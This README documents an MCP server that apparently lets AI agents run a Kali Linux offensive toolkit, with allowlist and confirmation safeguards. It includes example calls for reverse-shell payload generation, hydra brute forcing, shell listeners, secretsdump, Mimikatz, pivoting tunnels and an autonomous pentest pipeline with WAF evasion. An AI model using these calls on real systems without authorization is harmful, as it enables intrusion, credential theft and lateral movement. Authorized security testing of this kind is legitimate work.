# kali-security-bridge

[![test](https://github.com/flaviofilipe/kali-mcp/actions/workflows/test.yml/badge.svg)](https://github.com/flaviofilipe/kali-mcp/actions/workflows/test.yml)

An [MCP](https://modelcontextprotocol.io) server that gives Claude (or any
MCP-compatible AI agent) a complete offensive security testing toolkit —
reconnaissance, enumeration, web analysis, exploitation, credential access,
Active Directory lateral movement, post-exploitation, and pivoting — running
inside an isolated Kali Linux container, with a mandatory target allowlist,
rate limiting, a confirmation gate on high-risk actions, and a full audit log.

In short: **AI-driven penetration testing automation**, safely sandboxed in
Docker, exposed as 63 MCP tools so Claude Code, Claude Desktop, ChatGPT, or
any other MCP-compatible client can run a full web app / WordPress /
network / Active Directory pentest — Nmap port
scanning, Nikto and Nuclei vulnerability scanning, Gobuster/ffuf directory
brute forcing, SQLMap SQL injection testing, Hydra credential brute forcing,
WPScan WordPress auditing, John/Hashcat hash cracking, Metasploit, reverse
shell and evil-winrm session management, Impacket/BloodHound/NetExec Active
Directory tooling, LinPEAS/WinPEAS privilege-escalation enumeration, Chisel/
ligolo-ng pivoting, and automated Markdown/JSON reporting — all from a chat
conversation.

> ⚠️ Read [`SECURITY.md`](./SECURITY.md) before using this. This project runs
> real offensive tools (`hydra`, `sqlmap`, `metasploit`, credential dumping,
> lateral movement, etc.) — only ever against targets you have explicit
> authorization to test.

## Table of contents

- [Architecture and infrastructure](#architecture-and-infrastructure)
- [Minimum requirements](#minimum-requirements)
- [Tools available in the container](#tools-available-in-the-container)
- [Starting the Docker image](#starting-the-docker-image)
- [Tutorials — connecting an AI client](#tutorials--connecting-an-ai-client)
- [MCP tools — reference and usage examples](#mcp-tools--reference-and-usage-examples)
- [Local data](#local-data-outside-the-repository)

## Architecture and infrastructure

```
AI client (Claude Code / Claude Desktop / ChatGPT / ...)
        │  MCP — local stdio, OR remote HTTP with OAuth
        ▼
   server.py (FastMCP)  ──docker exec (no shell)──▶  kali-mcp-box container
        │                                              (Kali Linux + tools)
        ▼
  ~/.kali-mcp/findings.db (SQLite) + audit.log + reports
```

The project uses two topologies, depending on who's connecting:

| Component | Used | Role |
|---|---|---|
| **Docker** | always | Isolates the offensive tools inside their own container (`kali-mcp-box`), with `NET_ADMIN`/`NET_RAW` scoped to it — never on the host |
| **FastMCP** (Python) | always | Implements the MCP protocol and exposes the tools; runs over `stdio` (local) or `http` (remote) |
| **systemd (`--user`)** | remote mode | Keeps the HTTP server alive as a persistent service, with automatic restart and reboot survival (`loginctl enable-linger`) |
| **AWS Cognito** | remote mode | OAuth 2.1 Authorization Server — requires login before any tool call when exposed over HTTP. Never used in local stdio mode |
| **Cloudflare Tunnel** (`cloudflared`) | remote mode | Exposes the server on a real public domain with valid TLS. **Needed even for personal remote use**: OAuth registration for clients like Claude Desktop or ChatGPT is done by *the vendor's own backend* (Anthropic's, OpenAI's), which can't reach domains that only exist on private DNS/VPN (e.g. Tailscale's `.ts.net`) — see [why HTTPS is required](./docs/tutorials/remote-https-setup.md#why-https-is-required) |

No GPU/CUDA is involved anywhere in this — see the requirements section.

## Minimum requirements

### To run locally (stdio, used with Claude Code)

- **Docker** + **Docker Compose v2**
- **[uv](https://docs.astral.sh/uv/)** (manages Python 3.13 automatically)
- **CPU:** 2 cores (limit applied to the container via `docker-compose.yml`)
- **RAM:** 4 GB free (2 GB reserved for the container + host + Python process)
- **Disk:** ~6 GB free (final image ~3 GB; the multi-stage build can spike higher during the Go compile stage)
- **OS:** Linux or macOS with Docker Desktop. Windows works via WSL2
- A user with permission on the Docker socket (`docker` group or root)

### Additional, only for remote exposure (HTTP + OAuth)

- An **AWS** account (Cognito has a free tier — 50k MAUs/month free, plenty for personal use/small teams)
- **AWS CLI** configured, to create the User Pool/App Client
- **`cloudflared`** installed ([Cloudflare Tunnel](https://developers.cloudflare.com/cloudflare-one/connections/connect-apps/)) — no domain of your own needed to test (a Quick Tunnel generates a `*.trycloudflare.com` URL on the spot); a custom domain is recommended for permanent use
- **systemd** (`systemctl --user`) if running as a persistent service on Linux — on another OS, adapt to the equivalent process manager (launchd, etc.)

### GPU / CUDA

**Not used by this project.** No tool in the container (nmap, sqlmap,
hydra, nuclei, etc.) depends on a GPU — everything is CPU-bound. The
`docker-compose.yml` reserves no GPU device, and the Dockerfile installs no
CUDA/NVIDIA drivers. If the host machine has a GPU, it sits idle as far as
this project is concerned.

## Tools available in the container

Installed via `apt` (final image based on `kalilinux/kali-rolling`):

| Tool | Category |
|---|---|
| `nmap` | Port/service scanning |
| `smbclient` | SMB browsing/download — `smb_list_dir()`, `smb_get_file()` |
| `nikto` | Web vulnerability scanning |
| `testssl.sh` | SSL/TLS analysis |
| `wpscan` | WordPress security auditing |
| `sqlmap` | SQL injection testing |
| `hydra` | Credential brute forcing |
| `gobuster`, `dirb` | Directory enumeration |
| `ffuf` | Fast fuzzing |
| `metasploit-framework` | Exploitation (msfvenom, msfconsole) |
| `john`, `hashcat`, `hashid` | Hash identification / cracking |
| `exploitdb` (`searchsploit`) | Public-exploit lookup |
| `proxychains4` | Routing tool traffic through a pivot tunnel |
| `radare2`, `gdb`, `binwalk`, `exiftool`, `steghide` | Reverse engineering / forensics |
| `mariadb-client` | Direct MySQL/MariaDB enumeration |
| `tmux`, `netcat-traditional` | Session management (keeps a reverse shell alive across MCP calls) |
| `telnet`, `ftp` (`tnftp`) | Interactive Telnet/FTP clients — `connect_telnet()`, `enumerate_ftp()` |
| `curl`, `wget`, `chromium` | HTTP requests / rendering |

Compiled from source or fetched as a pinned prebuilt release in a separate Go
builder stage (`golang:1.24-bookworm`), with only the final binaries copied
into the image (keeps the final image lean):

| Tool | Category |
|---|---|
| `subfinder` | Subdomain enumeration |
| `katana` | Web application crawling |
| `nuclei` | Template-based CVE detection (updated at build time) |
| `dalfox` | XSS detection |
| `gowitness` | Screenshot evidence capture |
| `httpx-projectdiscovery` | Batch HTTP probing — renamed from `httpx`; that name is shadowed by the Python `httpx` HTTP-client library installed in `/opt/pymcp-venv` (see the Dockerfile comment) |
| `chisel` | Reverse-tunnel pivoting |
| `trufflehog` | Git/filesystem secret scanning |
| `ligolo-ng` (proxy + agent) | Full-network pivoting via a routed tun interface |

Installed via a dedicated `uv`-managed Python venv (`/opt/pymcp-venv`, kept
off Kali's system Python), or git-cloned at a pinned tag/commit when there's
no usable PyPI package:

| Tool | Category |
|---|---|
| `netexec` (`nxc`) | AD/SMB enumeration and lateral movement (successor to CrackMapExec) |
| `impacket` (`impacket-secretsdump`, `impacket-psexec`, ...) | AD credential dumping and lateral movement |
| `bloodhound-python` | Active Directory attack-path collection |
| `enum4linux-ng` | SMB/AD enumeration |
| `volatility3` (`vol`) | Memory forensics |
| `angr` | Binary symbolic execution |
| `pwntools` | CTF/binary-exploitation scripting |
| `SecretFinder`, `jwt_tool`, `graphw00f` | JS secret extraction, JWT analysis, GraphQL fingerprinting |
| `evil-winrm` (Ruby gem) | Windows session over WinRM |
| `Responder` | LLMNR/NBT-NS poisoning |

> ⚠️ **`graphw00f` is NOT installed via `pip install graphw00f`.** That
> exact name is registered on PyPI as an inert dependency-confusion decoy
> (its own package description says so) — the real tool only exists as a
> GitHub repo and is what the Dockerfile actually clones. Worth remembering
> before ever running `pip install <tool-name>` on a name lifted from
> documentation without checking PyPI first.

**Mimikatz** is staged only when explicitly requested at build time (see
below) — it's excluded by default because it's frequently AV/registry-policy
flagged. `run_mimikatz()` refuses to run if it isn't present in the image.

Wordlists included: `rockyou.txt` (decompressed at build time), Kali's
standard wordlists (`dirb`, `dirbuster`), and a custom sensitive-paths list
(`config/sensitive-paths.txt`, 60+ entries — `.env`, database backups,
`wp-config.php.bak`, etc.) used by `check_exposed_files`.

## Starting the Docker image

```bash
git clone <this-repository>
cd kali-mcp

# build the image (first time, or after updating the Dockerfile)
docker compose build

# start the container in the background — it stays alive waiting for MCP exec
docker compose up -d

# confirm it's up
docker ps --filter name=kali-mcp-box
```

To force a fully fresh image (updated packages/templates, no cache):

```bash
docker compose build --no-cache
docker compose up -d   # recreates the container from the new image
```

To include Mimikatz (off by default — see [SECURITY.md](./SECURITY.md)):

```bash
docker compose build --build-arg INCLUDE_OFFENSIVE_BINARIES=true
docker compose up -d
```

Rebuilding periodically is recommended — the image doesn't update itself,
and the Nuclei templates/`apt` packages stay frozen at build time.

## Tutorials — connecting an AI client

Full step-by-step guides live in [`docs/tutorials/`](./docs/tutorials/),
one per client, so this README stays a readable overview as more
integrations get added:

| Client | Where it runs | Guide |
|---|---|---|
| **Claude Code** | Same machine as the server (local `stdio`, no auth needed) | [docs/tutorials/claude-code.md](./docs/tutorials/claude-code.md) |
| **Claude Desktop** | Any machine (remote, HTTPS + OAuth) | [docs/tutorials/claude-desktop.md](./docs/tutorials/claude-desktop.md) |
| **ChatGPT** | Any machine (remote, HTTPS + OAuth) | [docs/tutorials/chatgpt.md](./docs/tutorials/chatgpt.md) |

Both remote clients share the same one-time infrastructure setup — AWS
Cognito for OAuth 2.1 + a Cloudflare Tunnel for TLS — documented once in
[docs/tutorials/remote-https-setup.md](./docs/tutorials/remote-https-setup.md),
which also explains *why* a real public HTTPS endpoint is a hard
requirement for these clients (short version: their backends, not your
browser, perform the OAuth handshake against your server, so a private-only
address or self-signed cert simply won't work). Local `stdio` (Claude Code)
needs none of that, since there's no network hop for anything to
authenticate.

See [docs/tutorials/README.md](./docs/tutorials/README.md) for the full
index, including how to add a guide for another client.

## MCP tools — reference and usage examples

Required workflow: **add the target to the allowlist before any scan.**
No tool will run against an unauthorized target.

### Governance

**`manage_allowlist`** — adds/removes/lists authorized targets
```python
manage_allowlist(action="add", entry="192.168.1.10", note="lab VM — authorized on 2026-05-18")
manage_allowlist(action="list")
manage_allowlist(action="remove", entry="192.168.1.10")
```

**`check_target_online`** — ping before any scan
```python
check_target_online(target="192.168.1.10")
```

**`resume_session`** — resumes an interrupted pentest, listing saved scans
```python
resume_session(target="example.com")
```

**`list_findings`** — queries the finding history in SQLite
```python
list_findings(target="192.168.1.10", limit=20)
```

**`generate_report`** — consolidates all findings for a target into one report
```python
generate_report(target="192.168.1.10", output_format="markdown")
```

**`request_high_risk_action`** — issues a 10-minute, single-use confirmation
token required before running a high-risk tool (credential dumping, lateral
movement, Mimikatz, netexec write/exec modes, opening a pivot tunnel)
```python
request_high_risk_action(
    action="impacket_secretsdump", target="10.0.0.20",
    justification="Domain Admin creds needed to validate lateral movement per engagement scope §3.2",
)
# -> {"token": "...", "expires_at": "..."} — pass the token as confirmation_token= to the gated tool
```

### Reconnaissance

**`scan_ports_nmap`** — port scanning, always the first phase
```python
scan_ports_nmap(target="192.168.1.10", flags="-sV -F")
scan_ports_nmap(target="192.168.1.10", flags="-p 1-65535 -sV", stealth=True)
# lab targets (HTB, THM, ...) commonly report "Host seems down" against
# Nmap's default discovery despite answering plain ICMP — retry with:
scan_ports_nmap(target="10.10.10.5", skip_host_discovery=True)
```

**`enumerate_ftp`** — anonymous (or credentialed) FTP login check + root
directory listing
```python
enumerate_ftp(target="192.168.1.10")  # anonymous:anonymous by default
enumerate_ftp(target="192.168.1.10", username="admin", password="pw")
```

**`enum_subdomains_subfinder`** — passive subdomain reconnaissance
```python
enum_subdomains_subfinder(domain="example.com")
```

**`scan_directories_gobuster`** — brute-force hidden directories/files
```python
scan_directories_gobuster(target_url="http://192.168.1.10", extensions="php,html,js,txt,bak,zip,env")
scan_directories_gobuster(target_url="https://app.local", evasion=True)  # target with a WAF
```

**`crawl_application_katana`** — crawling to discover endpoints/parameters
```python
crawl_application_katana(target_url="http://192.168.1.10", depth=3)
```

**`scan_fuzzing_ffuf`** — fast fuzzing of directories, parameters, or APIs
```python
scan_fuzzing_ffuf(target_url="http://192.168.1.10/FUZZ")                      # directories
scan_fuzzing_ffuf(target_url="http://192.168.1.10/page", param_name="id")     # GET parameter
scan_fuzzing_ffuf(target_url="http://192.168.1.10/login", param_name="user", method="POST")
```

### Vulnerability analysis

**`scan_vulnerabilities_nikto`** — general web vulnerability scan
```python
scan_vulnerabilities_nikto(target_url="http://192.168.1.10")
```

**`scan_ssl_testssl`** — weak protocols/ciphers, certificates, HEARTBLEED, etc.
```python
scan_ssl_testssl(target="app.example.com", port=443)
```

**`scan_nuclei`** — known CVEs via templates
```python
scan_nuclei(target_url="http://192.168.1.10", severity="high,critical")
scan_nuclei(target_url="http://192.168.1.10", tags="wordpress")
```

**`scan_xss_dalfox`** — reflected/DOM XSS
```python
scan_xss_dalfox(target_url="http://app.local/search?q=test")
```

**`scan_wordpress_wpscan`** — full WordPress audit
```python
scan_wordpress_wpscan(target_url="http://192.168.1.10", enumerate="vp,vt,u")
```

**`scan_xmlrpc_wordpress`** — attack vectors on xmlrpc.php
```python
scan_xmlrpc_wordpress(target_url="http://192.168.1.10")
```

### Exploitation

**`scan_sql_injection_sqlmap`** — SQL injection, always escalating risk gradually
```python
scan_sql_injection_sqlmap(target_url="http://app.local/user?id=1", risk=1, level=1)  # start here
```

**`brute_force_hydra`** — weak credentials on authentication services
```python
brute_force_hydra(target="192.168.1.10", service="ssh", port=22)
brute_force_hydra(
    target="192.168.1.10", service="http-post-form", port=80,
    http_form_path="/wp-login.php",
    http_form_data="log=^USER^&pwd=^PASS^&wp-submit=Log+In",
    http_form_fail="ERROR",
)
```

**`test_file_upload`** — PoC for unrestricted upload (CWE-434)
```python
test_file_upload(upload_url="http://192.168.1.10/upload.php", field_name="file")
```

**`enumerate_mysql_database`** — enumerate databases/tables/hashes with known credentials
```python
enumerate_mysql_database(host="192.168.1.10", user="root", password="root", database="wordpress")
```

**`metasploit_generate_payload`** — msfvenom wrapper; `lhost`/`lport` are your
own listener, so this doesn't touch the allowlist
```python
metasploit_generate_payload(payload="linux/x64/shell_reverse_tcp", lhost="10.10.10.5", lport=4444, format="elf")
```

**`metasploit_run_module`** — msfconsole wrapper, sets `RHOSTS` from `target` automatically
```python
metasploit_run_module(
    module="auxiliary/scanner/smb/smb_version", options={"RPORT": "445"}, target="192.168.1.10",
)
```

### Web utilities

**`make_http_request`** — custom HTTP request
```python
make_http_request(url="http://192.168.1.10/.env")
make_http_request(url="http://192.168.1.10/api/login", method="POST", body="user=admin&pass=test")
```

**`check_security_headers`** — CSP, HSTS, cookies, CORS, with severity
```python
check_security_headers(target_url="https://app.local")
```

**`check_exposed_files`** — `.env`, backups, `phpinfo.php`, etc.
```python
check_exposed_files(target_url="http://192.168.1.10")
```

**`screenshot_gowitness`** — visual evidence of the application
```python
screenshot_gowitness(target_url="http://192.168.1.10/admin")
```

### Credentials

**`identify_hash`** — identifies the likely hash algorithm(s) via `hashid`
```python
identify_hash(hash_value="5f4dcc3b5aa765d61d8327deb882cf99")
```

**`crack_hash_john`** / **`crack_hash_hashcat`** — offline dictionary attacks;
cracked plaintext is returned to you and persisted **encrypted** (see
[SECURITY.md](./SECURITY.md)), never logged in the clear
```python
crack_hash_john(hash_value="5f4dcc3b5aa765d61d8327deb882cf99", hash_type="raw-md5")
crack_hash_hashcat(hash_value="5f4dcc3b5aa765d61d8327deb882cf99", hash_mode=0)
```

**`search_exploit`** — Exploit-DB lookup via `searchsploit`; also called
automatically at the end of `scan_nuclei`/`scan_ports_nmap` for any CVE IDs
found in their output
```python
search_exploit(query="wordpress 6.2")
search_exploit(query="CVE-2023-1234")
```

### Sessions

**`start_reverse_shell_listener`** — nc listener kept alive in a tmux session
inside the container
```python
start_reverse_shell_listener(target="192.168.1.10", port=4444)
```

**`connect_telnet`** — opens a Telnet session via the same tmux-backed
session mechanism as reverse shells
```python
connect_telnet(target="192.168.1.10")
connect_telnet(target="192.168.1.10", port=2323)
```

**`session_exec`** — sends a command to an open session, revalidates the
allowlist on every call
```python
session_exec(session_id="a1b2c3d4e5f6", command="whoami")
```

**`session_status`** / **`session_list`** / **`session_close`**
```python
session_status()                                # list every session
session_list(target="192.168.1.10")
session_close(session_id="a1b2c3d4e5f6")
```

### Active Directory

**`enum_smb_shares`** — enum4linux-ng, read-only
```python
enum_smb_shares(target="192.168.1.20")
```

**`smb_list_dir`** — lists a share's contents (or a subdirectory within it)
via `smbclient`; use to find exact filenames before `smb_get_file`
```python
smb_list_dir(target="192.168.1.20", share="share")                     # anonymous
smb_list_dir(target="192.168.1.20", share="share", path="backups")
smb_list_dir(target="192.168.1.20", share="share", username="admin", password="pw")
```

**`smb_get_file`** — downloads a file from an SMB share and returns its
content directly
```python
smb_get_file(target="192.168.1.20", share="share", remote_path="flag.txt")
smb_get_file(target="192.168.1.20", share="share", remote_path="backups/usuarios.txt")
smb_get_file(target="192.168.1.20", share="share", remote_path="secret.docx", username="admin", password="pw")
```

**`enum_ad_netexec`** — netexec (`nxc`); read modes run directly, credential-
dump/exec modes require `request_high_risk_action` first
```python
enum_ad_netexec(target="192.168.1.20", mode="shares")
enum_ad_netexec(target="192.168.1.20", mode="ntds", confirmation_token="...")
```

**`bloodhound_collect`** — AD attack-path data collection
```python
bloodhound_collect(domain="corp.local", target="192.168.1.20", username="user", password="pass")
```

**`impacket_secretsdump`** / **`impacket_psexec`** — HIGH RISK, both require
a `confirmation_token`
```python
token = request_high_risk_action(
    action="impacket_secretsdump", target="192.168.1.20", justification="...",
)["token"]
impacket_secretsdump(target="192.168.1.20", username="admin", password="pw", confirmation_token=token)
```

**`evil_winrm_connect`** — opens a WinRM session via the same tmux-backed
session mechanism as reverse shells
```python
evil_winrm_connect(target="192.168.1.20", username="admin", password="pw")
```

### Post-exploitation

**`run_linpeas`** / **`run_winpeas`** — privilege-escalation enumeration
against an open session
```python
run_linpeas(session_id="a1b2c3d4e5f6")
run_winpeas(session_id="a1b2c3d4e5f6")
```

**`run_mimikatz`** — HIGH RISK, requires a `confirmation_token`; refuses to
run unless the image was built with `INCLUDE_OFFENSIVE_BINARIES=true`
```python
run_mimikatz(session_id="a1b2c3d4e5f6", confirmation_token="...")
```

### Pivoting

**`start_chisel_tunnel`** / **`start_ligolo_tunnel`** — both require the pivot
host in the allowlist AND a `confirmation_token`. Opening a tunnel never adds
anything to the allowlist — any host reached through it still needs its own
`manage_allowlist()` entry before it can be scanned.
```python
start_chisel_tunnel(target="192.168.1.20", local_port=9001, remote_port=8080, confirmation_token="...")
start_ligolo_tunnel(target="192.168.1.20", confirmation_token="...")
```

**`pivot_scan_via_proxychains`** — runs any command through the tunnel
```python
pivot_scan_via_proxychains(target="10.10.10.5", command="nmap -sV -F 10.10.10.5")
```

### Forensics / binary analysis

CTF/forensics workflow — not part of the standard web pentest flow.

```python
analyze_memory_volatility(dump_path="/tmp/dump.raw", plugin="windows.pslist")
disassemble_binary_r2(binary_path="/tmp/vuln")
debug_binary_gdb(binary_path="/tmp/vuln", commands="break main; run; info registers")
extract_binwalk(file_path="/tmp/firmware.bin")
```

**`analyze_binary_angr`** / **`exploit_pwntools_helper`** — EXPERIMENTAL,
execute caller-supplied Python inside the container
```python
analyze_binary_angr(binary_path="/tmp/vuln", analysis="cfg = proj.analyses.CFGFast(); result = len(cfg.graph.nodes)")
exploit_pwntools_helper(script="from pwn import *\np = process('/tmp/vuln')\np.sendline(b'A'*40)\nprint(p.recvall())")
```

### Secrets / JS / API

```python
scan_secrets_trufflehog(target_url_or_repo="https://github.com/org/repo.git")
scan_js_secretfinder(target_url="http://app.local/main.js")
analyze_jwt(token="eyJhbGciOiJIUzI1NiJ9...")
fingerprint_graphql_graphw00f(target_url="http://app.local/graphql")
```

### Orchestration

**`run_full_pentest`** — autonomous end-to-end pipeline (16 phases)
```python
run_full_pentest(target="192.168.1.10")
run_full_pentest(target="example.com", target_url="https://example.com", include_brute_force=True, evasion=True)
```

## Local data (outside the repository)

| Path | Contents |
|---|---|
| `~/.kali-mcp/findings.db` | SQLite: `findings`, `allowlist`, `sessions`, `credentials` (hash/plaintext columns Fernet-encrypted), `exploits`, `high_risk_confirmations` |
| `~/.kali-mcp/secret.key` | Fernet key (0600) that encrypts the `credentials` table — treat `~/.kali-mcp/` as a secret; see [SECURITY.md](./SECURITY.md) |
| `~/.kali-mcp/audit.log` | Audit log of every execution — sensitive fields (passwords, hashes, tokens) are redacted before logging |
| `~/.kali-mcp/workspaces/` | Reports generated by `generate_report` |
| `~/mcps/outputs/kali-mcp/<target>/` | Raw output of each scan + `session.json` (enables resuming via `resume_session`) |

## License

[MIT](./LICENSE)
